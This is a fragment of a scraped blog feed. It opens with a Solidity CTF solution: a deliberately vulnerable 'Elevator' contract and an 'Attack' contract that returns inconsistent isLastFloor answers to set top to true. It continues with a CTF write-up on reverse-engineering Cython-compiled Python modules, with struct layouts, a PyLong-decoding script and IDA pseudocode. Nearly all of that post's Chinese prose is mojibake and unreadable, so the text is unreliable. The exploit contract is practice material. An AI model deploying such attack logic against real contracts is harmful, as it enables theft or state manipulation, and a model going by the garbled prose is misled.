<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack is Building&#123;</span><br><span class="line">    uint256 times = 0;</span><br><span class="line">    Elevator target;</span><br><span class="line"></span><br><span class="line">    constructor (address _target) public &#123;</span><br><span class="line">        target = Elevator(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint256) external returns (bool)&#123;</span><br><span class="line">        if(times == 0)&#123;</span><br><span class="line">            times = 1;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.goTo(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web3</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythoné€†å‘</title>
    <url>/2024/12/23/Python%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<p>è®°å½•ä¸€ä¸‹æ¯”èµ›ä¸­é‡åˆ°çš„Pythoné€†å‘å­¦ä¹ å¿ƒå¾—</p>
<span id="more"></span>

<h2 id="CPythoné€†å‘"><a href="#CPythoné€†å‘" class="headerlink" title="CPythoné€†å‘"></a>CPythoné€†å‘</h2><p>å¦‚æœpythonç¨‹åºä¸­è°ƒç”¨äº†ä¸€ä¸ªæ‰“åŒ…æˆ<code>.pyd</code>æˆ–è€…<code>.so</code>çš„å¤–éƒ¨è¿æ¥åº“ é‚£ä¹ˆé‚£ä¸ªåº“å¤§æ¦‚ç‡å°±æ˜¯Cythonç¼–è¯‘æ‰“åŒ…çš„ ç›´æ¥å½“æˆ<code>.dll</code>æˆ–è€…<code>.so</code>æ¥é€†å‘ </p>
<p>æ­£å¼å¼€å§‹é€†å‘ä¹‹å‰éœ€è¦å…ˆçŸ¥é“å‡ ä¸ªå…³äºCPythonçš„æœ€åŸºç¡€çš„çŸ¥è¯†ç‚¹ æ–¹ä¾¿åç»­ç†è§£</p>
<h3 id="PyObject"><a href="#PyObject" class="headerlink" title="PyObject"></a>PyObject</h3><p>pythonä¸­æ‰€æœ‰ç±»éƒ½åŸºäºä¸€ä¸ªæœ€åŸºç¡€çš„<code>Object</code>ç±» è€ŒCythonåšçš„äº‹æ— éå°±æ˜¯å°†pythonå®ç°è½¬ä¸ºCå®ç° åŸæœ¬çš„<code>Object</code>ç±»åœ¨CPythonä¸­è¿™ä¸ªç±»å°±æ˜¯<code>PyObject</code>ç»“æ„ä½“ é€†å‘è¿‡ç¨‹ä¸­è§åˆ°çš„æ‰€æœ‰pythonå˜é‡éƒ½æ˜¯è¿™ä¸ªç±»çš„æ´¾ç”Ÿç±» è¿™ä¸ªç±»çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Py_obj</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _QWORD refcnt;    <span class="comment">// å¼•ç”¨æ¬¡æ•° ç”¨äºå†…å­˜å›æ”¶æœºåˆ¶</span></span><br><span class="line">    Py_obj *type;    <span class="comment">// å˜é‡çš„ç±»å‹</span></span><br><span class="line">    _QWORD size;    <span class="comment">// å˜é‡çš„å¤§å°</span></span><br><span class="line">    _QWORD item;    <span class="comment">// å˜é‡çš„å€¼</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å°½ç®¡ä¸€äº›ç‰¹æ®Šçš„ç±»(å¦‚ <code>PyUnicode</code>, <code>PyTuple</code>, â€¦)åœ¨å€¼çš„å­˜å‚¨æ–¹å¼ä¸Šä¸æœ€åŸºç¡€çš„ç±»æœ‰äº›è®¸ä¸åŒä¹‹å¤– æ‰€æœ‰ç±»å‹çš„pythonåŸç”Ÿç±»éƒ½éµå¾ªè¿™ä¸ªç»“æ„ä½“å¸ƒå±€   å…¶ä¸­éœ€è¦ç‰¹åˆ«è¯´æ˜çš„æ˜¯<code>PyLong</code>ç±»</p>
<h4 id="PyLong"><a href="#PyLong" class="headerlink" title="PyLong"></a>PyLong</h4><p>å®ƒçš„å†…å­˜åˆ†å¸ƒä¾ç„¶éµå¾ªä¸Šè¿°è§„åˆ™ å¦‚:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-095622.png" alt="image-20241223095615394"></p>
<p>ä½†æ˜¯å­˜æ”¾çš„å€¼ä¸èƒ½ç®€å•çš„ç›´æ¥é€šè¿‡å°ç«¯åºè½¬åŒ–æˆçœŸæ­£è¡¨ç¤ºçš„æ•°å€¼ pythonä¸ºäº†é˜²æ­¢æº¢å‡º æ¯ä¸ª<code>_DWORD</code>åªä½¿ç”¨å…¶ä¸­çš„30bitsç”¨äºå­˜æ”¾æ•°æ®(30&#x2F;32) è€Œ<code>PyLong</code>ä¸­çš„<code>size</code>å­—æ®µè¡¨ç¤ºçš„æ˜¯æ‰€å­˜æ”¾çš„å€¼å  <code>(size // 8) * 30</code> bitsçš„å†…å­˜ å› æ­¤åœ¨ä¸æŸ¥æ‰¾å…¨å±€æ„é€ è¡¨å•çº¯é åŠ¨è°ƒæ¥è·å–æŸä¸ªCPythonæ•´å‹çš„å€¼æ—¶éœ€è¦åšä¸€äº›ç‰¹æ®Šçš„å¤„ç† è¿™é‡Œç»™å‡ºä¸€ä¸ªè·å–CPythonæ•´å‹æ—¶å¯ä»¥ç”¨çš„è„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">digtsLen = (size // <span class="number">8</span>)</span><br><span class="line">digtsAddr = PyobjAddr + <span class="number">8</span> * <span class="number">3</span></span><br><span class="line">pynum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(digtsLen):</span><br><span class="line">    t = <span class="built_in">int</span>.from_bytes(get_bytes(digtsAddr + i * <span class="number">4</span>, <span class="number">4</span>), <span class="string">&#x27;little&#x27;</span>) &amp; <span class="number">0x3FFFFFFF</span></span><br><span class="line">    pynum |= t &lt;&lt; (<span class="number">30</span> * i)</span><br></pre></td></tr></table></figure>

<h3 id="è°ƒè¯•æ–¹æ³•"><a href="#è°ƒè¯•æ–¹æ³•" class="headerlink" title="è°ƒè¯•æ–¹æ³•"></a>è°ƒè¯•æ–¹æ³•</h3><p>ç›´æ¥å½“åŠ¨æ€é“¾æ¥åº“è°ƒè¯• è¦é™„åŠ åˆ°çš„ç¨‹åºå°±æ˜¯å¯¹åº”é¢˜ç›®ç”¨æ¥ç¼–è¯‘çš„pythonç‰ˆæœ¬çš„pythonè§£é‡Šå™¨</p>
<h3 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h3><h4 id="å¯»æ‰¾åˆå§‹åŒ–å‡½æ•°"><a href="#å¯»æ‰¾åˆå§‹åŒ–å‡½æ•°" class="headerlink" title="å¯»æ‰¾åˆå§‹åŒ–å‡½æ•°"></a>å¯»æ‰¾åˆå§‹åŒ–å‡½æ•°</h4><p>æ­£å¼å¼€å§‹é€†å‘çš„ç¬¬ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°pythonä¸­ä½¿ç”¨åˆ°çš„æ‰€æœ‰å­—é¢å€¼ ä¾‹å¦‚:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(i * <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å°±æœ‰<code>4</code>, <code>0x10</code>ä¸¤ä¸ªå­—é¢å€¼ åœ¨Cythonæ‰“åŒ…pythonä»£ç æ—¶ç±»ä¼¼è¿™ä¸¤ä¸ªçš„æ‰€æœ‰å­—é¢å€¼éƒ½ä¼šåœ¨ä¸€ä¸ªå‡½æ•°(<code>__Pyx_InitConstants</code> ä½†æ˜¯é€šå¸¸ç¼–è¯‘å‡ºæ¥çš„åŠ¨æ€é“¾æ¥åº“éƒ½ä¼šå»ç¬¦å·è¡¨æ‰€ä»¥çŸ¥é“ç¬¦å·æ²¡ä»€ä¹ˆç”¨)ä¸­è¿›è¡Œåˆå§‹åŒ–:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = [<span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x100</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> table:</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> CYTHON_SMALL_CODE <span class="type">int</span> __Pyx_InitConstants(<span class="type">void</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (__Pyx_CreateStringTabAndInitStrings() &lt; <span class="number">0</span>) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error);</span><br><span class="line">  __pyx_int_1 = PyInt_FromLong(<span class="number">1</span>); <span class="keyword">if</span> (unlikely(!__pyx_int_1)) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_int_2 = PyInt_FromLong(<span class="number">2</span>); <span class="keyword">if</span> (unlikely(!__pyx_int_2)) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_int_4 = PyInt_FromLong(<span class="number">4</span>); <span class="keyword">if</span> (unlikely(!__pyx_int_4)) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_int_8 = PyInt_FromLong(<span class="number">8</span>); <span class="keyword">if</span> (unlikely(!__pyx_int_8)) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_int_16 = PyInt_FromLong(<span class="number">16</span>); <span class="keyword">if</span> (unlikely(!__pyx_int_16)) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_int_32 = PyInt_FromLong(<span class="number">32</span>); <span class="keyword">if</span> (unlikely(!__pyx_int_32)) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_int_64 = PyInt_FromLong(<span class="number">64</span>); <span class="keyword">if</span> (unlikely(!__pyx_int_64)) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_int_128 = PyInt_FromLong(<span class="number">128</span>); <span class="keyword">if</span> (unlikely(!__pyx_int_128)) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_int_256 = PyInt_FromLong(<span class="number">256</span>); <span class="keyword">if</span> (unlikely(!__pyx_int_256)) __PYX_ERR(<span class="number">0</span>, <span class="number">1</span>, __pyx_L1_error)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  __pyx_L1_error:;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºç‰¹å¾å°±æ˜¯å¤§é‡è°ƒç”¨<code>PyInt_FromLong</code> åœ¨IDAä¸­æ˜¯è¿™ä¸ªå®å¯¹åº”çš„å‡½æ•°<code>PyLong_FromLong</code> é€šè¿‡äº¤å‰å¼•ç”¨è¿™ä¸ªå‡½æ•°æ‰¾åˆ°å¤§é‡è°ƒç”¨äº†å®ƒçš„å‡½æ•° è¿™ä¸ªå‡½æ•°å¤§æ¦‚ç‡å°±æ˜¯<code>__Pyx_InitConstants</code> é™¤æ­¤ä¹‹å¤–ä¸€äº›é•¿åº¦è¿‡é•¿çš„æ•´å‹ä¹Ÿä¼šé€šè¿‡ä»å­—ç¬¦ä¸²è½¬åŒ–æˆPyLongçš„æ–¹å¼åˆå§‹åŒ– è¿™æ—¶å€™åªéœ€è¦åœ¨Stringsä¸­æ‰¾åˆ°çº¯æ•°å­—å­—ç¬¦ä¸²å°±èƒ½å®šä½åˆ°åˆå§‹åŒ–å‡½æ•°:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-131642.png" alt="image-20241223131635173"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-131653.png" alt="image-20241223131653876"></p>
<h4 id="å¯»æ‰¾ç›®æ ‡å‡½æ•°"><a href="#å¯»æ‰¾ç›®æ ‡å‡½æ•°" class="headerlink" title="å¯»æ‰¾ç›®æ ‡å‡½æ•°"></a>å¯»æ‰¾ç›®æ ‡å‡½æ•°</h4><p>åœ¨pythonä¸­å®ç°çš„å‡½æ•°åœ¨Cythonç¼–è¯‘ååœ¨å‡½æ•°çš„ç»“å°¾ä¼šæœ‰<code>__Pyx_AddTraceback(&quot;Module_Name.Function_Name&quot;, __pyx_clineno, __pyx_lineno, __pyx_filename);</code> ä¹Ÿå°±æ˜¯è¯´åªè¦æ‰¾åˆ°<code>Module_Name.Function_Name</code>è¿™ä¸ªå­—ç¬¦ä¸²å°±èƒ½æ‰¾åˆ°ç›®æ ‡å‡½æ•°</p>
<p>å°†ä¹‹å‰çš„ä»£ç å†™åˆ°å‡½æ•°é‡Œ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.pyx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    table = [<span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x100</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> table:</span><br><span class="line">        <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure>

<p>å†ç”¨Cythonç¼–è¯‘ä¸€æ¬¡ æ‰¾åˆ°æ¨¡å—åå’Œå‡½æ•°å(è¿™é‡Œæ¨¡å—åå°±æ˜¯xxx.pydä¸­çš„xxx):</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-133248.png" alt="image-20241223133248174"></p>
<p>äº¤å‰å¼•ç”¨å°±èƒ½æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-133419.png" alt="image-20241223133419317"></p>
<p>æœ‰æ—¶å€™å‡ºç°äº†äº¤å‰å¼•ç”¨çš„ç»“æœä¸æ­¢ä¸€ä¸ª æ˜¯å› ä¸ºåœ¨åˆ«çš„åœ°æ–¹è°ƒç”¨åˆ°äº†è¿™ä¸ªå‡½æ•° åœ¨Cythonä¸­è°ƒç”¨å‡½æ•°éœ€è¦å†™è¿›ä¸€ä¸ªwrapperé‡Œ å…¶ä¸­ä¹Ÿä¼šåŒ…å«äº†<code>__Pyx_AddTraceback(&quot;Module_Name.Function_Name&quot;, __pyx_clineno, __pyx_lineno, __pyx_filename);</code>  å®šä½åˆ°ç›®æ ‡å‡½æ•°ä¹Ÿå¾ˆç®€å• å› ä¸ºè¿™é‡Œä½œä¸ºwrapperæœ€åä¹Ÿæ˜¯è¦è°ƒç”¨ç›®æ ‡å‡½æ•°çš„:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-133841.png" alt="image-20241223133841700"></p>
<h3 id="è¿˜åŸpythonä»£ç "><a href="#è¿˜åŸpythonä»£ç " class="headerlink" title="è¿˜åŸpythonä»£ç "></a>è¿˜åŸpythonä»£ç </h3><p>é¦–å…ˆå°±æ˜¯åœ¨IDAä¸­å®šä¹‰ä¸Šé¢è¯´çš„PyObjectç»“æ„ä½“æ–¹ä¾¿é€†å‘ ç„¶ååœ¨é™æ€åˆ†ææ—¶éœ€è¦éœ€è¦å¿½ç•¥å¾ˆå¤šç”¨äºå†…å­˜å›æ”¶çš„ä»£ç å— ç‰¹å¾å°±æ˜¯è°ƒç”¨äº†<code>Py_Dealloc</code>å‡½æ•° å‚æ•°å°±æ˜¯è¦é‡Šæ”¾çš„å˜é‡ è€Œè¿™äº›éƒ½æ˜¯ç³»ç»Ÿçš„äº‹ åœ¨è¿˜åŸä»£ç ä¸Šå‡ ä¹æ²¡æœ‰å¸®åŠ© æ‰€ä»¥è¿™éƒ¨åˆ†ä»£ç å—éƒ½å¯ä»¥å¿½ç•¥ å¦‚:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-150524.png" alt="image-20241223150524555"></p>
<p>æ­¤å¤–è¿˜æœ‰äº§ç”Ÿå˜é‡æ—¶å¯¹å˜é‡çš„æ£€æŸ¥ä¹Ÿå¯ä»¥å¿½ç•¥ åŸºæœ¬ä¸Šå°±æ˜¯åœ¨è°ƒç”¨äº†CPythonçš„APIåäº§ç”Ÿçš„å˜é‡ä¼šç«‹é©¬è¿›è¡Œä¸€æ¬¡æ£€æµ‹ è¿™éƒ¨åˆ†åœ¨é¢„æœŸå†…æ˜¯ä¸€å®šä¼šæˆåŠŸçš„ æ‰€ä»¥å¯ä»¥å¿½ç•¥</p>
<p>ä¸€èˆ¬çš„pythonæ“ä½œå…¨éƒ¨éƒ½ä¼šç”¨CPythonçš„APIæ¥å®ç° åªè¦åšå¥½æ³¨é‡Šå’Œå˜é‡å‘½åå¾ˆå®¹æ˜“çœ‹å‡ºé€»è¾‘ è¿™é‡Œåªç»™å‡ºä¸€äº›ç‰¹æ®Šç»“æ„</p>
<h4 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h4><p>ä»¥è¿™ä¸¤ç§å¾ªç¯ä¸ºä¾‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    table = [<span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x100</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> table:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line">    lenth = <span class="built_in">len</span>(table)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(lenth):</span><br><span class="line">        <span class="built_in">print</span>(table[i])</span><br></pre></td></tr></table></figure>

<p>åœ¨çœ‹CPythonçš„å®ç°æ—¶å°±èƒ½å‘ç°å…¶å®å†…éƒ¨å®ç°å‡ ä¹å°±æ˜¯ä¸€è‡´çš„:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-175908.png" alt="image-20241223175908405"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-180101.png" alt="image-20241223180101028"></p>
<p>å¯ä»¥çœ‹åˆ°å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ç›´æ¥ä½¿ç”¨ä¸‹æ ‡æ¥è®¿é—®æ—¶ä¼šå¯¹è¦è®¿é—®çš„ä¸‹æ ‡è¿›è¡Œè¶Šç•Œåˆ¤æ–­ è‹¥è¶Šç•Œåˆ™ä¼šä½¿ç”¨<code>PyObject_GetItem</code>æ¥æŠ›å‡ºé”™è¯¯ å¦åˆ™ç›´æ¥ä»åº•å±‚è®¿é—®åˆ—è¡¨<code>table</code>çš„<code>item</code>æˆå‘˜ è¿™ä¸ªæˆå‘˜åŒ…å«äº†9ä¸ª<code>PyLong</code>å¯¹è±¡(<code>[0x1, 0x2, 0x4, 0x8, 0x10, 0x20, 0x40, 0x80, 0x100]</code>)</p>
<h4 id="è°ƒç”¨"><a href="#è°ƒç”¨" class="headerlink" title="è°ƒç”¨"></a>è°ƒç”¨</h4><p>å¦å¤–ä¸€ä¸ªé‡ç‚¹å°±æ˜¯åˆ†è¾¨ä½¿ç”¨åˆ°çš„pythonå†…ç½®å‡½æ•° è¿™äº›å‡½æ•°å› ä¸ºä¸å±äºCPython APIçš„å†…å®¹ éƒ½ä¸ä¼šåƒä¸Šé¢çš„è¢«è¯†åˆ«å‡ºæ¥çš„å¤–éƒ¨å‡½æ•°ä¸€æ ·ç›´æ¥çœ‹å¾—åˆ°å‡½æ•°å è€Œæ˜¯åƒè°ƒç”¨æ‰€æœ‰ç”¨æˆ·å‡½æ•°ä¸€æ ·é€šè¿‡wrapperè°ƒç”¨:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-181108.png" alt="image-20241223181108180"></p>
<p>åœ¨è¿™é‡Œ<code>v5</code>å°±æ˜¯è·å–åˆ°çš„å‡½æ•° <code>v2</code>å°±æ˜¯å¯¹åº”çš„pythonå‡½æ•°å¯¹è±¡:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-181316.png" alt="image-20241223181316165"></p>
<h4 id="åˆ—è¡¨æ¨å¯¼å¼"><a href="#åˆ—è¡¨æ¨å¯¼å¼" class="headerlink" title="åˆ—è¡¨æ¨å¯¼å¼"></a>åˆ—è¡¨æ¨å¯¼å¼</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    newtable = [x &lt;&lt; <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> table]</span><br></pre></td></tr></table></figure>

<p>ä»¥æ­¤ä¸ºä¾‹</p>
<p>å¾—åˆ°ä¼ªä»£ç :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )&#123;</span><br><span class="line">    x_ = *(Py_obj **)(arr_-&gt;item + <span class="number">8</span> * idx_);</span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(x_-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">      ++LODWORD(x_-&gt;refcnt);</span><br><span class="line">    v32 = v31;</span><br><span class="line">    ++idx_;</span><br><span class="line">    v31 = x_;</span><br><span class="line">    <span class="keyword">if</span> ( v32 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( SLODWORD(v32-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = v32-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v22 )</span><br><span class="line">          Py_Dealloc(v32);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( x_-&gt;type != (Py_obj *)PyLong_Type[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_90;</span><br><span class="line">    size = x_-&gt;size;</span><br><span class="line">    <span class="keyword">if</span> ( (size &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size &gt;= <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( (x_-&gt;size &gt;&gt; <span class="number">3</span>) * (<span class="number">1</span> - (x_-&gt;size &amp; <span class="number">3uLL</span>)) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">0xFFFFFFFFFFFFFFFE</span>uLL:</span><br><span class="line">            v35 = -(__int64)(LODWORD(x_-&gt;item) | ((<span class="type">unsigned</span> __int64)HIDWORD(x_-&gt;item) &lt;&lt; <span class="number">30</span>));</span><br><span class="line">            <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">            v35 = LODWORD(x_-&gt;item) | ((<span class="type">unsigned</span> __int64)HIDWORD(x_-&gt;item) &lt;&lt; <span class="number">30</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            v36 = (Py_obj *)(*(__int64 (__fastcall **)(Py_obj *, Py_obj *))(PyLong_Type[<span class="number">12</span>] + <span class="number">88LL</span>))(x_, table[<span class="number">24</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v34 = LODWORD(x_-&gt;item) * (<span class="number">1</span> - (size &amp; <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">if</span> ( v34 == (<span class="number">2</span> * v34) &gt;&gt; <span class="number">1</span> || !v34 )</span><br><span class="line">        &#123;</span><br><span class="line">          v36 = (Py_obj *)PyLong_FromLong((<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">2</span> * v34));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v35 = v34;</span><br><span class="line">LABEL_87:</span><br><span class="line">          <span class="keyword">if</span> ( v35 == (__int64)(<span class="number">2</span> * v35) &gt;&gt; <span class="number">1</span> )</span><br><span class="line">            v36 = (Py_obj *)PyLong_FromLongLong(<span class="number">2</span> * v35, v35, PyLong_Type[<span class="number">0</span>], table[<span class="number">24</span>]);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">LABEL_90:</span><br><span class="line">            v36 = (Py_obj *)PyNumber_Lshift(x_, table[<span class="number">24</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      x_ = v36;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(x_-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">      ++LODWORD(x_-&gt;refcnt);</span><br><span class="line">LABEL_92:</span><br><span class="line">    <span class="keyword">if</span> ( !x_ )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v37 = new_table-&gt;size;</span><br><span class="line">    <span class="keyword">if</span> ( new_table[<span class="number">1</span>].refcnt &lt;= v37 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)PyList_Append(new_table, x_) )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">2529</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_105;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( LODWORD(x_-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">        ++LODWORD(x_-&gt;refcnt);</span><br><span class="line">      *(_QWORD *)(new_table-&gt;item + <span class="number">8</span> * v37) = x_;</span><br><span class="line">      new_table-&gt;size = v37 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(x_-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = x_-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v22 )</span><br><span class="line">        Py_Dealloc(x_);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( idx_ &gt;= arr_-&gt;size )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å®é™…ä¸Šå°±æ˜¯æ‹†æˆäº†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> table:</span><br><span class="line">    newtable.append(x)</span><br></pre></td></tr></table></figure>

